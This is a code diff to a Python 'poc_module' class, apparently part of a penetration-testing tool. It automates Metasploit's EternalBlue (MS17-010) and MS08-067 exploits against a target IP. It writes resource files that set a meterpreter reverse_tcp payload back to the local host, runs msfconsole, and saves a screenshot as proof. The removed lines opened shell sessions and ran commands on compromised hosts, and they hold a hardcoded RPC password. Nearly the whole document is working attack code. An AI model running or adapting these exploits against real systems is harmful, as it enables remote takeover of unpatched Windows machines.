@@ -1,7 +1,9 @@
 import subprocess
+import os
 import smbclient
 import re
-from pymetasploit3.msfrpc import MsfRpcClient
+import shutil
+
 class poc_module:
     def __init__(self,ipaddress):
         self.ip = ipaddress
@@ -13,46 +15,60 @@ class poc_module:
         except:
             exploit_folder = "NULL"
             return exploit_folder
+    def write_config(self,file,ipaddress,module):
+        #1 for bridege
+        #2 localhost
+        #3 vpn
+        lhost = subprocess.check_output(["hostname -I | awk '{print $3}'"],shell=True).decode("utf-8")
+        if module == "ms17010":
+            file.write('use exploit/windows/smb/ms17_010_eternalblue \n')
+            file.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
+            file.write('set RHOST '+str(ipaddress)+'\n')
+            # file.write('set LHOST '+str(subprocess.check_output(["hostname -I | awk '{print $1}'"],shell=True).decode("utf-8"))+'\n') bridege
+            file.write('set LHOST '+str(lhost))
+            file.write('set AutoRunScript multiscript -rc auto.rc'+'\n')
+            file.write('exploit \n')
+            file.write('exit -y \n')
+        if module == "ms08067":
+            file.write('use exploit/windows/smb/ms08_067_netapi \n')
+            file.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
+            file.write('set RHOST '+str(ipaddress)+'\n')
+            # file.write('set LHOST '+str(subprocess.check_output(["hostname -I | awk '{print $1}'"],shell=True).decode("utf-8"))+'\n') bridege
+            file.write('set LHOST '+str(lhost))
+            file.write('set AutoRunScript multiscript -rc auto.rc'+'\n')
+            file.write('exploit \n')
+            file.write('exit -y \n')
     def ms17010_poc(self):
-        client = MsfRpcClient('1qaz@WSX',ssl=False)
-        exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
-        exploit['RHOSTS']  = str(self.ip)
-        print(self.ip)
-        exploit.execute(payload="windows/x64/shell/bind_tcp")
-        # print(client.sessions.list)
-        # print(result)
-        if bool(client.sessions.list):
-            print(client.sessions.list)
-            session_number = list(client.sessions.list.keys())[0]
-            print(session_number)
-            shell = client.sessions.session(session_number)
-            shell.write('dir')
-            result = shell.read()
-            
-            final_result = "\n".join(result.splitlines()[4:10])
-            
-            return final_result
-        else:
-            print("null")
+        configFile=open('ms17010configure.rc','w')
+        self.write_config(configFile,self.ip,"ms17010")
+        configFile.close()
+        os.system('msfconsole -r ms17010configure.rc')
+        try:
+            old_pic_name = [e for e in os.listdir('.') if e.endswith("jpeg")][0]
+            new_pic_name = str(self.ip).replace('.','_',3)+".jpeg"
+            os.rename(old_pic_name,new_pic_name)
+            final_path = "data/picture/"+new_pic_name
+            shutil.move(new_pic_name, final_path)
+            os.remove("ms17010configure.rc")
+            return final_path
+        except:
+            os.remove("ms17010configure.rc")
             return "NULL"
     def ms08067_poc(self):
-        client = MsfRpcClient('1qaz@WSX',ssl=False)
-        exploit = client.modules.use('exploit','windows/smb/ms08_067_netapi')
-        exploit['RHOSTS']  = self.ip
-        exploit.execute(payload='windows/meterpreter/reverse_tcp')
+        configFile=open('ms08067configure.rc','w')
+        self.write_config(configFile,self.ip,"ms08067")
+        configFile.close()
+        os.system('msfconsole -r ms08067configure.rc')
+        try:
+            old_pic_name = [e for e in os.listdir('.') if e.endswith("jpeg")][0]
+            new_pic_name = str(self.ip).replace('.','_',3)+".jpeg"
+            os.rename(old_pic_name,new_pic_name)
+            final_path = "data/picture/"+new_pic_name
+            shutil.move(new_pic_name, final_path)
+            os.remove("ms08067configure.rc")
+            return final_path
+        except:
+            os.remove("ms08067configure.rc")
+            return "NULL"
 
-        if bool(client.sessions.list):
-            session_number = list(client.sessions.list.keys())[0]
-            shell = client.sessions.session(session_number)
-            print(session_number)
-            shell.write('dir')
-            result = shell.read()
-            result = "\n".join(result.splitlines()[4:10])
-            # shell.stop()
-        else:
-            result ="NULL"
-        return result
-
-# data = {"prove":""}
-print(poc_module("10.10.234.174").ms17010_poc())
-# print(data['prove'])
+# print(poc_module("10.10.115.190").ms17010_poc())
